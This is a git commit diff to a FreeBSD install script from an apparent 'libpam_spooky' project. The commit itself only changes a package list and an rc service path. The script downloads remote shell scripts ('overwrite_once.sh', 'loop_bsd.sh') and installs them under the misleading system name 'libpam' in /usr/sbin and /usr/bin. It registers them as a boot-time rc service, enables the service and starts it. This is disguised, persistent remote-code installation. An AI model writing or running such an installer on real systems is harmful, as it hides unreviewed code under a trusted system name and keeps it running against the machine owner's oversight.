cb8f6753650b67192bd637f39f31350e97146580
FlamingSpork <philo_bunny@yahoo.com>
2020-10-30 21:19:44 -0400

    Fixed rc service path

--- install_bsd.sh
+++ install_bsd.sh
@@ -1,14 +1,14 @@
 #!/bin/sh
 
-pkg install -y vim-console curl bash
+pkg install -y vim-console curl bash ca_root_nss
 curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/overwrite_once.sh" > /usr/sbin/libpam
 chmod +x /usr/sbin/libpam
 
 curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/loop_bsd.sh" > /usr/bin/libpam
 chmod +x /usr/bin/libpam
 
-curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.rc" > /usr/local/etc/rc.d/libpam
-chmod +x /usr/local/etc/rc.d/libpam
+curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.rc" > /etc/rc.d/libpam
+chmod +x /etc/rc.d/libpam
 echo 'libpam_enable="YES"' >> /etc/rc.conf
 
 service libpam onestart
